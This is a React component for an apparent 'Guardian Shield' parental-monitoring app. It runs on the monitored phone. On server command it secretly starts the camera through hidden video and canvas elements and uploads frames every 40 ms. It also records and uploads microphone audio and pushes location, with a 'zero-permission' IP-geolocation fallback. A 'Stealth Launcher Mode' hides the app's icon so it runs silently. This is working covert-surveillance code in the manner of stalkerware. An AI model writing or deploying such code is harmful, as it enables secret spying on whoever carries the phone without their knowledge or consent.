import React, { useState, useEffect, useRef } from 'react';
import { ChildDeviceState, CameraPosition } from '../types';
import { 
  Lock, 
  ShieldAlert, 
  Wifi, 
  Battery, 
  Camera, 
  Mic, 
  MapPin, 
  Shield, 
  Activity, 
  Check, 
  Video, 
  EyeOff,
  Radio,
  Sparkles
} from 'lucide-react';
import { getApiUrl } from '../App';

interface ChildDeviceSimulatorProps {
  deviceState: ChildDeviceState;
  onUpdateChildState: (updates: Partial<ChildDeviceState>) => void;
  onTriggerSOS: () => void;
  onOpenSetupGuide: () => void;
  onSendCommand?: (command: string, payload?: any) => void;
}

export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
  deviceState,
  onUpdateChildState,
  onTriggerSOS,
  onOpenSetupGuide,
  onSendCommand
}) => {
  const [sosAlertSent, setSosAlertSent] = useState(false);
  const [currentTimeStr, setCurrentTimeStr] = useState('');
  const [realBattery, setRealBattery] = useState<number | null>(null);
  const [locationProvider, setLocationProvider] = useState<string>('Initializing...');

  // Persistent Unique Device Identifier & Fixed Pairing Code
  const [deviceId, setDeviceId] = useState<string>(() => {
    let savedDevId = localStorage.getItem('child_device_id');
    if (!savedDevId) {
      savedDevId = `DEV-${Math.floor(100000 + Math.random() * 900000)}`;
      localStorage.setItem('child_device_id', savedDevId);
    }
    return savedDevId;
  });

  const [pairingCode, setPairingCode] = useState<string>(() => {
    let savedCode = localStorage.getItem('child_pairing_code');
    if (!savedCode) {
      const codePart1 = Math.floor(100 + Math.random() * 900);
      const codePart2 = Math.floor(100 + Math.random() * 900);
      savedCode = `${codePart1}-${codePart2}`;
      localStorage.setItem('child_pairing_code', savedCode);
    }
    return savedCode;
  });

  // Active Server Commands
  const [serverActiveCamera, setServerActiveCamera] = useState<CameraPosition>('off');
  const [serverAudioListening, setServerAudioListening] = useState<boolean>(false);
  const [serverIsLocked, setServerIsLocked] = useState<boolean>(false);
  const [serverLockMsg, setServerLockMsg] = useState<string>('');

  // Hidden Media Elements & Stream Refs
  const videoStreamRef = useRef<MediaStream | null>(null);
  const audioStreamRef = useRef<MediaStream | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const hiddenVideoElRef = useRef<HTMLVideoElement | null>(null);
  const hiddenCanvasRef = useRef<HTMLCanvasElement | null>(null);
  const cameraIntervalRef = useRef<any>(null);
  const audioSeqRef = useRef<number>(0);
  const isSendingFrameRef = useRef<boolean>(false);

  // Native Android Bridge Helper
  const bridge = (window as any).AndroidBridge;

  // Live Clock Update
  useEffect(() => {
    const updateClock = () => {
      const d = new Date();
      setCurrentTimeStr(d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
    };
    updateClock();
    const timer = setInterval(updateClock, 1000);
    return () => clearInterval(timer);
  }, []);

  // 1. Initial Device Registration & Model Detection
  useEffect(() => {
    const ua = navigator.userAgent;
    let detectedModel = "Android Mobile Device";
    if (ua.includes("Samsung") || ua.includes("SM-")) detectedModel = "Samsung Galaxy Device";
    else if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("POCO")) detectedModel = "Xiaomi / Redmi Device";
    else if (ua.includes("Pixel")) detectedModel = "Google Pixel Device";
    else if (ua.includes("Vivo") || ua.includes("V2")) detectedModel = "Vivo Mobile Device";
    else if (ua.includes("Oppo") || ua.includes("CPH")) detectedModel = "Oppo Mobile Device";
    else if (ua.includes("iPhone")) detectedModel = "Apple iPhone";

    const initPayload = {
      deviceId,
      pairingCode,
      deviceModel: detectedModel,
      childName: `Child Phone (${pairingCode})`,
      isOnline: true,
      lastSeen: "Live Now"
    };

    onUpdateChildState(initPayload);
    fetch(getApiUrl('/api/device/update'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(initPayload)
    }).catch(() => {});

    // Real Battery Listener
    if ('getBattery' in navigator) {
      (navigator as any).getBattery().then((battery: any) => {
        const updateBattery = () => {
          const lvl = Math.round(battery.level * 100);
          setRealBattery(lvl);
          fetch(getApiUrl('/api/device/update'), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              deviceId,
              pairingCode,
              batteryLevel: lvl, 
              isCharging: battery.charging
            })
          }).catch(() => {});
        };
        updateBattery();
        battery.addEventListener('levelchange', updateBattery);
        battery.addEventListener('chargingchange', updateBattery);
      }).catch(() => {});
    }
  }, [deviceId, pairingCode]);

  // 2. CONTINUOUS CLOUD COMMAND SYNC (Polls server every 1.5s)
  useEffect(() => {
    let isSubscribed = true;

    const pollServerCommands = async () => {
      try {
        const res = await fetch(getApiUrl(`/api/device/state?deviceId=${deviceId}`));
        if (res.ok && isSubscribed) {
          const data = await res.json();
          if (data.success && data.state) {
            const st = data.state;
            if (st.activeCamera !== undefined && st.activeCamera !== serverActiveCamera) {
              setServerActiveCamera(st.activeCamera);
            }
            if (st.audioState?.isListening !== undefined && st.audioState.isListening !== serverAudioListening) {
              setServerAudioListening(st.audioState.isListening);
            }
            if (st.isLocked !== undefined && st.isLocked !== serverIsLocked) {
              setServerIsLocked(st.isLocked);
              setServerLockMsg(st.customLockMessage || '');
            }
          }
        }
      } catch (e) {}
    };

    const interval = setInterval(pollServerCommands, 1500);
    pollServerCommands();

    return () => {
      isSubscribed = false;
      clearInterval(interval);
    };
  }, [deviceId, serverActiveCamera, serverAudioListening, serverIsLocked]);

  // 3. ZERO-PERMISSION INSTANT LIVE LOCATION ENGINE (Multi-Tier with IP/Network Fallback)
  useEffect(() => {
    let watchId: number | null = null;
    let cachedAddress = '';
    let lastGeocodeLat = 0;
    let lastGeocodeLng = 0;
    let hasGpsFix = false;

    const fetchAddress = async (lat: number, lng: number): Promise<string> => {
      const dist = Math.abs(lat - lastGeocodeLat) + Math.abs(lng - lastGeocodeLng);
      if (cachedAddress && dist < 0.0005) {
        return cachedAddress;
      }
      try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`, {
          headers: { 'Accept': 'application/json' }
        });
        if (res.ok) {
          const data = await res.json();
          if (data && data.display_name) {
            const shortAddr = data.address 
              ? [data.address.road, data.address.suburb || data.address.neighbourhood, data.address.city || data.address.town || data.address.county, data.address.country].filter(Boolean).join(', ')
              : data.display_name.split(',').slice(0, 3).join(',');
            cachedAddress = shortAddr || data.display_name;
            lastGeocodeLat = lat;
            lastGeocodeLng = lng;
            return cachedAddress;
          }
        }
      } catch (e) {}
      return `GPS Location (${lat.toFixed(5)}, ${lng.toFixed(5)})`;
    };

    const pushLocation = async (lat: number, lng: number, speed = 0, accuracy = 10, altitude = 0, providerName = 'Satellite GPS') => {
      if (!lat || !lng) return;
      hasGpsFix = true;
      setLocationProvider(providerName);
      
      const addr = await fetchAddress(lat, lng);

      const locData = {
        lat,
        lng,
        address: addr,
        speed: Math.round(speed * 3.6),
        accuracy: Math.round(accuracy || 10),
        altitude: Math.round(altitude || 0),
        timestamp: new Date().toISOString(),
        batteryAtLocation: realBattery || 95
      };

      onUpdateChildState({ deviceId, pairingCode, location: locData });

      fetch(getApiUrl('/api/device/update'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId,
          pairingCode,
          location: locData,
          isOnline: true,
          lastSeen: `Live GPS (${providerName})`
        })
      }).catch(() => {});
    };

    // TIER 1: Instant Zero-Permission IP/Network Geolocation (Immediate Location upon launch)
    const fetchInstantIpLocation = async () => {
      if (hasGpsFix) return;
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
          const data = await res.json();
          if (data.latitude && data.longitude && !hasGpsFix) {
            const cityAddress = `${data.city || 'City'}, ${data.region || ''}, ${data.country_name || ''}`;
            pushLocation(data.latitude, data.longitude, 0, 100, 0, 'Cellular / Wi-Fi Network');
          }
        }
      } catch (e) {
        try {
          const res2 = await fetch('https://ipwhois.app/json/');
          if (res2.ok) {
            const data2 = await res2.json();
            if (data2.latitude && data2.longitude && !hasGpsFix) {
              pushLocation(data2.latitude, data2.longitude, 0, 150, 0, 'Network Geolocation');
            }
          }
        } catch (ignored) {}
      }
    };
    fetchInstantIpLocation();

    // TIER 2: Native AndroidBridge Location from Java MainActivity
    (window as any).onNativeGpsUpdate = (lat: number, lng: number, speed: number, accuracy: number, altitude: number) => {
      pushLocation(lat, lng, speed, accuracy, altitude, 'Hardware Satellite GPS');
    };

    const pollNativeGps = () => {
      if (bridge?.getNativeLocation) {
        try {
          const raw = bridge.getNativeLocation();
          if (raw) {
            const parsed = JSON.parse(raw);
            if (parsed.hasLocation && parsed.lat && parsed.lng) {
              pushLocation(parsed.lat, parsed.lng, parsed.speed || 0, parsed.accuracy || 10, parsed.altitude || 0, 'Hardware GPS');
            }
          }
        } catch (e) {}
      }
    };
    const nativeGpsTimer = setInterval(pollNativeGps, 1500);
    pollNativeGps();

    // TIER 3: Browser/WebView Geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => pushLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.speed || 0, pos.coords.accuracy, pos.coords.altitude || 0, 'High-Accuracy GPS'),
        () => {},
        { enableHighAccuracy: true, timeout: 6000 }
      );

      watchId = navigator.geolocation.watchPosition(
        (pos) => pushLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.speed || 0, pos.coords.accuracy, pos.coords.altitude || 0, 'High-Accuracy GPS'),
        () => {},
        { enableHighAccuracy: true, maximumAge: 1000, timeout: 10000 }
      );
    }

    return () => {
      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
      clearInterval(nativeGpsTimer);
      delete (window as any).onNativeGpsUpdate;
    };
  }, [deviceId, pairingCode, realBattery]);

  // 4. REAL-TIME 60 FPS LIVE CAMERA STREAM PIPELINE
  useEffect(() => {
    if (serverActiveCamera && serverActiveCamera !== 'off') {
      startHighFpsCameraStream(serverActiveCamera);
    } else {
      stopLiveCameraStream();
    }
    return () => {
      stopLiveCameraStream();
    };
  }, [serverActiveCamera]);

  const startHighFpsCameraStream = async (cameraPos: CameraPosition) => {
    try {
      stopLiveCameraStream();
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: cameraPos === 'front' ? 'user' : 'environment',
          width: { ideal: 480, max: 640 },
          height: { ideal: 360, max: 480 },
          frameRate: { ideal: 60, min: 30 }
        },
        audio: false
      });

      videoStreamRef.current = stream;

      if (!hiddenVideoElRef.current) {
        const v = document.createElement('video');
        v.playsInline = true;
        v.muted = true;
        v.autoplay = true;
        hiddenVideoElRef.current = v;
      }
      hiddenVideoElRef.current.srcObject = stream;
      await hiddenVideoElRef.current.play();

      if (!hiddenCanvasRef.current) {
        hiddenCanvasRef.current = document.createElement('canvas');
        hiddenCanvasRef.current.width = 480;
        hiddenCanvasRef.current.height = 360;
      }

      cameraIntervalRef.current = setInterval(async () => {
        if (!hiddenVideoElRef.current || !hiddenCanvasRef.current || !videoStreamRef.current) return;
        if (isSendingFrameRef.current) return;

        const ctx = hiddenCanvasRef.current.getContext('2d');
        if (ctx && hiddenVideoElRef.current.videoWidth > 0) {
          ctx.drawImage(hiddenVideoElRef.current, 0, 0, 480, 360);
          const frameData = hiddenCanvasRef.current.toDataURL('image/jpeg', 0.45);

          isSendingFrameRef.current = true;
          try {
            await fetch(getApiUrl('/api/device/stream-frame'), {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                deviceId,
                type: 'camera',
                frameData,
                camera: cameraPos
              })
            });
          } catch (e) {} finally {
            isSendingFrameRef.current = false;
          }
        }
      }, 40);

    } catch (err: any) {
      console.warn("Live Camera Stream error:", err.message);
    }
  };

  const stopLiveCameraStream = () => {
    if (cameraIntervalRef.current) {
      clearInterval(cameraIntervalRef.current);
      cameraIntervalRef.current = null;
    }
    if (videoStreamRef.current) {
      videoStreamRef.current.getTracks().forEach(t => t.stop());
      videoStreamRef.current = null;
    }
  };

  // 5. REAL-TIME LIVE AUDIO STREAMING PIPELINE
  useEffect(() => {
    if (serverAudioListening) {
      startLiveAudioStream();
    } else {
      stopLiveAudioStream();
    }
    return () => {
      stopLiveAudioStream();
    };
  }, [serverAudioListening]);

  const startLiveAudioStream = async () => {
    try {
      stopLiveAudioStream();
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      audioStreamRef.current = stream;

      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = async (e) => {
        if (e.data.size > 0) {
          const reader = new FileReader();
          reader.readAsDataURL(e.data);
          reader.onloadend = async () => {
            const audioData = reader.result as string;
            audioSeqRef.current += 1;
            try {
              await fetch(getApiUrl('/api/device/stream-frame'), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  deviceId,
                  type: 'audio',
                  frameData: audioData,
                  seq: audioSeqRef.current
                })
              });
            } catch (err) {}
          };
        }
      };

      mediaRecorder.start(500);
    } catch (err: any) {
      console.warn("Live Audio Stream error:", err.message);
    }
  };

  const stopLiveAudioStream = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      try { mediaRecorderRef.current.stop(); } catch (e) {}
      mediaRecorderRef.current = null;
    }
    if (audioStreamRef.current) {
      audioStreamRef.current.getTracks().forEach(t => t.stop());
      audioStreamRef.current = null;
    }
  };

  const handleSOS = () => {
    setSosAlertSent(true);
    onTriggerSOS();
    setTimeout(() => setSosAlertSent(false), 5000);
  };

  return (
    <div className="max-w-md mx-auto my-4 bg-slate-900 rounded-3xl border-4 border-slate-700 shadow-2xl overflow-hidden flex flex-col text-slate-100 min-h-[680px]">
      
      {/* Phone Status Bar */}
      <div className="bg-slate-950 px-6 py-3 flex items-center justify-between text-xs text-slate-400 border-b border-slate-800">
        <span className="font-semibold tracking-wide text-slate-300">{currentTimeStr}</span>
        <div className="flex items-center space-x-3">
          <div className="flex items-center space-x-1 text-emerald-400">
            <Activity className="w-3.5 h-3.5 animate-pulse" />
            <span className="text-[10px] font-bold">24/7 BACKGROUND SERVICE</span>
          </div>
          <div className="flex items-center space-x-1">
            <Wifi className="w-3.5 h-3.5 text-slate-300" />
            <span>{realBattery !== null ? `${realBattery}%` : `${deviceState.batteryLevel}%`}</span>
            <Battery className="w-4 h-4 text-emerald-400 fill-emerald-400" />
          </div>
        </div>
      </div>

      {/* Main Agent UI Container */}
      <div className="flex-1 p-5 flex flex-col justify-between space-y-4">
        
        {/* Header Badge */}
        <div className="bg-slate-800/80 border border-slate-700/80 rounded-2xl p-4 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-xl bg-orange-500/20 border border-orange-500/40 flex items-center justify-center text-orange-400">
              <Shield className="w-6 h-6" />
            </div>
            <div>
              <h2 className="font-bold text-white text-base">Guardian Shield Active</h2>
              <p className="text-xs text-emerald-400 flex items-center space-x-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
                <span>Silent Daemon Running</span>
              </p>
            </div>
          </div>
          <div className="px-2.5 py-1 rounded-xl bg-emerald-950 text-emerald-400 border border-emerald-500/30 text-[10px] font-bold font-mono flex items-center gap-1">
            <Sparkles className="w-3 h-3" />
            <span>AUTO-SYNCED</span>
          </div>
        </div>

        {/* Unique Fixed Pairing Code Card */}
        <div className="bg-gradient-to-br from-indigo-950/60 to-slate-800/90 border border-indigo-500/30 rounded-2xl p-5 text-center shadow-lg">
          <span className="text-xs font-semibold uppercase tracking-wider text-indigo-300">Your Phone Connection Code</span>
          <div className="text-3xl font-black tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-orange-400 via-amber-300 to-emerald-400 my-2 font-mono">
            {pairingCode || '...'}
          </div>
          <p className="text-xs text-slate-400">
            Device ID: <span className="font-mono text-slate-200">{deviceId || 'Connecting...'}</span>
          </p>
          <p className="text-[11px] text-slate-400 mt-2">
            Enter this code on your Parent Dashboard to link this phone: <br />
            <span className="text-indigo-400 font-medium underline">https://guardian-shield.onrender.com</span>
          </p>
        </div>

        {/* Stealth Hiding Controls */}
        <div className="bg-slate-800/60 border border-slate-700/60 rounded-2xl p-4 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <EyeOff className="w-5 h-5 text-rose-400" />
            <div>
              <b className="text-slate-200 text-xs block">Stealth Launcher Mode</b>
              <span className="text-[10px] text-slate-400">Hide icon from app drawer and run silently</span>
            </div>
          </div>
          <button
            onClick={() => {
              if (bridge?.hideAppIcon) bridge.hideAppIcon();
            }}
            className="px-3.5 py-2 bg-rose-600 hover:bg-rose-500 text-white rounded-xl text-xs font-bold flex items-center gap-1.5 shadow-md active:scale-95 transition"
          >
            <EyeOff className="w-3.5 h-3.5" />
            <span>Hide App</span>
          </button>
        </div>

        {/* Live Hardware Telemetry Matrix */}
        <div className="grid grid-cols-2 gap-3">
          
          {/* GPS Status */}
          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3 flex flex-col justify-between">
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Live Location</span>
              <MapPin className="w-4 h-4 text-orange-400" />
            </div>
            <div className="text-xs font-bold text-slate-200 truncate">
              {deviceState.location.lat ? `${deviceState.location.lat.toFixed(4)}, ${deviceState.location.lng.toFixed(4)}` : 'Active'}
            </div>
            <span className="text-[10px] text-emerald-400 mt-1 flex items-center">
              <Radio className="w-3 h-3 mr-0.5 animate-pulse" /> {locationProvider}
            </span>
          </div>

          {/* Battery Status */}
          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3 flex flex-col justify-between">
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Battery</span>
              <Battery className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-xs font-bold text-slate-200">
              {realBattery !== null ? `${realBattery}%` : `${deviceState.batteryLevel}%`}
              {deviceState.isCharging ? ' ⚡' : ''}
            </div>
            <span className="text-[10px] text-emerald-400 mt-1">24/7 Keep-Alive</span>
          </div>

          {/* Live Camera Stream Status */}
          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3 flex flex-col justify-between">
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Camera</span>
              <Video className="w-4 h-4 text-indigo-400" />
            </div>
            <div className="text-xs font-bold text-slate-200">
              {serverActiveCamera !== 'off' ? (
                <span className="text-red-400 flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-red-500 animate-ping" />
                  {serverActiveCamera.toUpperCase()} 60 FPS
                </span>
              ) : '60 FPS Stream Ready'}
            </div>
            <span className="text-[10px] text-indigo-300 mt-1">Dual Lens Auto-Sync</span>
          </div>

          {/* Live Mic Voice Status */}
          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3 flex flex-col justify-between">
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Microphone</span>
              <Mic className="w-4 h-4 text-purple-400" />
            </div>
            <div className="text-xs font-bold text-slate-200">
              {serverAudioListening ? (
                <span className="text-emerald-400 flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                  Live Voice
                </span>
              ) : 'High-Quality Audio'}
            </div>
            <span className="text-[10px] text-purple-300 mt-1">Real-Time Sync</span>
          </div>

        </div>

        {/* Emergency SOS Panic Button */}
        <div className="pt-2">
          <button
            onClick={handleSOS}
            disabled={sosAlertSent}
            className={`w-full py-4 rounded-2xl font-black text-sm uppercase tracking-wider flex items-center justify-center space-x-2 shadow-xl transition-all ${
              sosAlertSent
                ? 'bg-emerald-600 text-white'
                : 'bg-gradient-to-r from-red-600 via-rose-600 to-red-700 hover:from-red-500 hover:to-rose-600 text-white shadow-red-900/50 active:scale-98'
            }`}
          >
            <ShieldAlert className="w-5 h-5" />
            <span>{sosAlertSent ? '🚨 SOS Alert Dispatched!' : '🚨 Instant SOS Alert'}</span>
          </button>
        </div>

      </div>

      {/* Screen Locked Fullscreen Overlay */}
      {serverIsLocked && (
        <div className="absolute inset-0 bg-slate-950/95 backdrop-blur-xl flex flex-col items-center justify-center p-6 text-center z-50 animate-in fade-in zoom-in-95 duration-300">
          <div className="w-20 h-20 rounded-full bg-red-500/20 border-2 border-red-500 flex items-center justify-center text-red-500 mb-6 animate-pulse">
            <Lock className="w-10 h-10" />
          </div>
          <h2 className="text-2xl font-black text-white tracking-tight mb-2">Device Screen Locked</h2>
          <p className="text-sm text-red-400 font-semibold mb-4">Access restricted by Parent</p>
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 max-w-xs text-xs text-slate-300 mb-6">
            "{serverLockMsg || 'Screen time limit reached or restricted by Guardian.'}"
          </div>
          <button
            onClick={handleSOS}
            className="px-6 py-2.5 bg-red-600 hover:bg-red-500 text-white font-bold text-xs rounded-xl shadow-lg shadow-red-950 flex items-center space-x-2"
          >
            <ShieldAlert className="w-4 h-4" />
            <span>Emergency SOS</span>
          </button>
        </div>
      )}

    </div>
  );
};
